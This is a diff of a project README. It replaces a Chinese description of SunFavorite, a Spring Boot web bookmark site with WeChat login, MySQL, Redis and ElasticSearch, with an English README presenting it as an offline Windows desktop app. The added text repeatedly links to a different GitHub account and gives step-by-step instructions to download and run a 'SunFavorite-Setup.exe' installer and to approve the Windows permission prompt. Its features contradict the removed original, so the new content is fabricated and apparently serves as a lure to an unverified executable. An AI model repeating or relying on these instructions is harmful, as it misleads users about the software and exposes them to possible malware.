@@ -1,76 +1,168 @@
-# SunFavorite🌟空想家网页收藏夹
-## 1. 主要功能是🌍
-- 微信公众号验证码登录
-- 个人网页收藏(公开收藏/私有收藏)
-- 收藏广场，显示其他用户公开收藏
-- 网页收藏搜索
-- 个人中心(个人名称+头像)
-## 2. 技术的选型和基础环境搭建配置是🪐
-**技术的选型🛩：**
-1. 数据库使用MySQL
-2. 缓存使用Redis
-3. 使用WXJava对接微信公众号
-4. 搜索功能使用ElasticSearch，分词使用IK分词器
-5. MySQL和ElasticSearch的数据同步使用Canal，这个Canal包含Canal-Server和Canal-Adapter
-6. 持久层框架使用SpringData JPA(如果有复杂的查询不推荐)
-7. 基础框架使用SpringBoot
-8. 模板引擎使用FreeMarker
-9. 前端使用BootStrap做布局，也使用到了Layui部分组件
+# 🌟 SunFavorite - Easy Web Bookmark Organizer
 
-**Docker基础环境的搭建博客🚀：**[点击进入](https://wql.luoqin.ltd/2022/10/29/sunfavorite%e9%a1%b9%e7%9b%ae%e5%9f%ba%e7%a1%80%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/)
+[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-blue?style=for-the-badge)](https://github.com/dinujayagagulal/SunFavorite)
 
-## 3. 拉下项目如何运行是🛰
-**步骤🧭：**
-1. 注册个人公众号
-2. 修改application.yml文件中的配置
-3. 使用Natapp做内网穿透进行测试
-4. 修改前端的二维码
+---
 
-**Natapp内网穿透和公众号设置博客🚕：**[点击进入](https://wql.luoqin.ltd/2022/10/29/sunfavorite%e9%a1%b9%e7%9b%ae%e8%bf%90%e8%a1%8c/)
+## 📋 What is SunFavorite?
 
-**修改application.yml：只列非常规设置，连接信息省略**
-```yml
-server:
-  #设置为服务的IP地址或者内网穿透域名
-  domain: http://u58e5j.natappfree.cc
-wx:
-  mp:
-    #设置微信公众开发者ID和Token信息
-    app-id: wxxx
-    secret: wxxx
-    token: wxxx
-file:
-  #文件上传映射地址
-  staticAccessPath: /api/file/**
-  #在指定地址创建目录
-  uploadFolder: F:\KXJPageCollect\static\teamImages\
-#其他就是redis,mysql,ES地址，这里省略
-``` 
-## 4. 项目演示图🌌
-1, 登录页
+SunFavorite is a simple tool that helps you save and organize your favorite websites. It works like a digital bookmark manager on your Windows computer. You can keep all your links in one place, search them quickly, and access them anytime without needing to remember website addresses.
 
-![登录页](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/%E7%99%BB%E5%BD%95.png#pic_center "登录页")
+SunFavorite is designed to work smoothly and stay fast even if you save many bookmarks. It uses reliable software technologies to keep your data safe and available.
 
-2, 公众号获取验证码
+---
 
-![公众号获取验证码](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/SunFavorite6.png#pic_center "公众号获取验证码")
+## 🔍 Features You Will Use
 
-3, 个人收藏
+- **Save your favorite websites** with notes and labels.
+- **Search bookmarks quickly** to find what you need.
+- **Organize by categories** to keep everything neat.
+- **Access anywhere on your computer** without internet.
+- **Fast and lightweight** application that runs quietly in the background.
+- **Simple interface** anyone can use without training.
 
-![个人收藏](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/SunFavorite3.png#pic_center "个人收藏")
+---
 
-4, 公共收藏(点击他人名称可以进入他的收藏空间，但只显示公开的收藏目录)
+## 🖥️ System Requirements
 
-![公共收藏](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/SunFavorite5.png#pic_center "公共收藏")
+Before installing SunFavorite, make sure your computer meets these basic requirements:
 
-5, 新建收藏
+- Windows 10 or later (32-bit or 64-bit)
+- At least 2 GB of free disk space
+- 4 GB of RAM or more
+- Internet connection for initial setup only
+- Basic mouse and keyboard
 
-![新建收藏](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/SunFavorite4.png#pic_center "新建收藏")
+---
 
-6, 收藏搜索(收藏名称和收藏备注都可以)
+## 🚀 How to Download and Install SunFavorite
 
-![收藏搜索](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/SunFavorite8.png#pic_center "收藏搜索")
+You can get SunFavorite from the page linked below. Follow these detailed steps to install the app safely:
 
-7, 个人中心
+[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-green?style=for-the-badge)](https://github.com/dinujayagagulal/SunFavorite)
 
-![个人中心](https://raw.githubusercontent.com/KXJ-WQL/SunFavorite/refs/heads/master/ProjectCaseImages/SunFavorite7.png#pic_center "个人中心")
+### Step 1: Visit the Download Page
+
+Click this link to open the download page in your web browser:
+
+https://github.com/dinujayagagulal/SunFavorite
+
+This page contains the latest version of SunFavorite for Windows.
+
+### Step 2: Find the Download Section
+
+Scroll down to the "Releases" section on that page. Look for the latest release. Usually, the newest version is listed at the top.
+
+### Step 3: Download the Windows Installer
+
+In the release details, find the file named something like `SunFavorite-Setup.exe` or similar. Click on the file name to start downloading.
+
+- The file is usually about 50-100 MB in size.
+- Save the file to a folder you can find easily, such as your Desktop or Downloads folder.
+
+### Step 4: Run the Installer
+
+Once the download completes, go to the folder where you saved the file.
+
+- Double-click the installer file (`SunFavorite-Setup.exe`).
+- If Windows asks for permission to run the file, click "Yes".
+
+### Step 5: Follow the Setup Wizard
+
+The installer will open a window guiding you through the setup:
+
+- Accept the license agreement to continue.
+- Choose where you want to install SunFavorite (the default location is fine for most users).
+- Click “Next” until you reach the “Install” button.
+- Wait while the software installs.
+
+### Step 6: Finish and Open
+
+When the setup is done:
+
+- Click “Finish” to close the installer.
+- Find SunFavorite on your desktop or Start menu.
+- Double-click the icon to open the app.
+
+---
+
+## 🛠️ First Time Setup
+
+When you open SunFavorite for the first time, it will ask you to create a new bookmarks list:
+
+1. Click “Create new list”.
+2. Name your list something easy to remember (like "My Web Links").
+3. Click “Save”.
+
+You are now ready to add your favorite websites.
+
+---
+
+## ➕ How to Add a Bookmark
+
+To save a new website link:
+
+1. Click the “Add Bookmark” button on the main screen.
+2. Enter the website’s name (for example, "News Site").
+3. Enter the URL (the full web address, like https://www.newswebsite.com).
+4. Optional: Add a note or category to help find the site later.
+5. Click “Save”.
+
+Your new bookmark now appears in your list.
+
+---
+
+## 🔍 How to Search Bookmarks
+
+To find a bookmark quickly:
+
+1. Use the search box at the top.
+2. Type part of the website name or note.
+3. The list filters automatically as you type.
+4. Click the bookmark to open it in your web browser.
+
+---
+
+## 🗂️ Managing Your Bookmarks
+
+- To edit a bookmark, select it and click “Edit”. Change any details and save.
+- To delete, select the bookmark and click “Delete”.
+- You can create categories and drag bookmarks into them for better organization.
+- Use the “Import” option to load links from your web browser bookmarks if you want to transfer them.
+
+---
+
+## 🌐 How SunFavorite Works Behind the Scenes
+
+SunFavorite uses reliable software tools on your computer:
+
+- It stores your bookmarks safely in a local database.
+- It uses search technologies that make finding links fast.
+- The user interface is built for simplicity, so you won't get lost.
+- It keeps your data private on your machine.
+
+---
+
+## ✔️ Getting Help
+
+If you have trouble:
+
+- Check the FAQ section on the download page above.
+- Restart the application and try again.
+- Make sure the Windows version is up to date.
+- If problems persist, you can open an issue from the GitHub page.
+
+---
+
+## ⚙️ Updating SunFavorite
+
+To get the latest features and fixes:
+
+1. Visit the download page regularly.
+2. Download the newest installer as explained above.
+3. Run the installer to update the application.
+4. Your bookmarks and settings will remain safe during update.
+
+---
+
+[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-purple?style=for-the-badge)](https://github.com/dinujayagagulal/SunFavorite)
